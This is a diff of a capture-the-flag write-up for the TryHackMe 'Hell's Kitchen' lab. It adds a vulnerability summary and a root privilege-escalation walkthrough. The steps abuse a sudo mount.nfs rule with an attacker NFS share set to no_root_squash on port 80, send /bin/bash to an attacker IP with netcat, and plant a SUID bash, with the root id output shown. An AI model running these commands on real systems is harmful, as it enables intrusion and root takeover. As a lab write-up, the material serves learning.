@@ -10,7 +10,7 @@
 What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.
 Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.
 
-![image]()
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2014-22-10.png)
 
 ---
 
@@ -23,10 +23,17 @@ Investigate the websites of the 'Ton Hotel and see if you can find anything that
 ---
 
 ## Summary
-- **Target IP:** 10.130.191.50
-- **OS:** Linux (Ubuntu)
-- **Vulnerabilities:**
 
+* **Target IP:** 10.130.191.50 / `kitchen.thm`
+* **OS:** Linux (Ubuntu)
+* **Vulnerabilities Identified:**
+* **SQL Injection (SQLi):** Unsanitized input in the `booking_key` (`booking_id`) parameter on `/api/booking-info` allowing arbitrary database queries (SQLite).
+* **Command Injection (RCE):** Unsanitized WebSocket timezone payload processing in the `/ws` handler allowing remote shell command execution.
+* **Plaintext Credential Exposure:** Sensitive user credentials stored in readable database tables (`email_access`), hidden configuration files (`.dad`), and embedded image data.
+* **Sudo Misconfiguration (Privilege Escalation):** Overly permissive `sudoers` policy allowing execution of `/usr/sbin/mount.nfs` without mount flag restrictions.
+
+
+***Ports Discovered***
 
 | Port | State | Service | Service Version / Info |
 | --- | --- | --- | --- |
@@ -415,3 +422,96 @@ steghide: could not extract any data with that passphrase!
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-51-40.png)
 
+> Well it made me struggle here and I had to get some help, because of connection timeouts and firewall. The target machine only allowed outbound connections through port 80 and 443. So while keeping the rev shell on port 443, I had to share a directory over port 80.
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2013-59-25.png)
+
+> First, we need to have a nfs server on our attacker machine
+
+```bash
+sudo apt install nfs-kernel-server
+```
+
+> Then I created shared a directory `/tmp/share`.
+
+```bash
+mkdir /tmp/share
+sudo chown nobody:nogroup
+sudo chmod 755 /tmp/share
+```
+
+> Export the directory, and allow all clients to access it.
+
+```bash
+sudo echo "/tmp/share *(rw,sync,no_subtree_check,no_root_squash)" > /etc/exports
+```
+
+```bash
+sudo exportfs -ra
+```
+
+> Restart the NFS server
+
+```bash
+sudo systemctl enable nfs-server
+sudo systemctl start nfs-server
+```
+
+> As we know, firewall only allows us to use 80,443. Since 443 is busy, we have to use 80.
+
+```bash
+sudo nano /etc/nfs.conf
+port=80 # Uncomment this line
+```
+
+> Restart rpcbind and nfc-server
+
+```bash
+sudo systemctl restart nfs-server
+sudo systemctl restart rpcbind
+```
+
+> On the victim machine, we create a share folder, go inside /tmp/share, and transfer bash binary to our kali machine. After giving it +xs bits, and transferring it to the victim machine, we are able to escalate privileges.
+
+```bash
+sudo /usr/sbin/mount.nfs -o port=80 <ATTACKER_IP>:/ /home/jojo/share -wv
+```
+
+> Transferring via nc - Victim
+
+```bash
+nc -w 3 10.8.211.1 443 < /bin/bash
+```
+
+> Receiving the binary - Attacker
+
+```bash
+nc -l -p 443 > bash
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2013-59-09.png)
+
+> Giving SUID and x bits
+
+```bash
+root@ip-10-130-99-48:/tmp/share# chmod +xs bash
+root@ip-10-130-99-48:/tmp/share# ls -l
+total 1156
+-rwsr-sr-x 1 root root 1183448 Aug  5 09:57 bash
+```
+
+> Exploitation
+
+```
+jojo@tonhotel:~/share/tmp/share$ ./bash -p
+./bash -p
+bash-5.0# id
+id
+uid=1003(jojo) gid=1003(jojo) euid=0(root) egid=0(root) groups=0(root),1003(jojo)
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2014-04-54.png)
+
+---
+
+> This was tough :D Leave a star if you like the writeups!
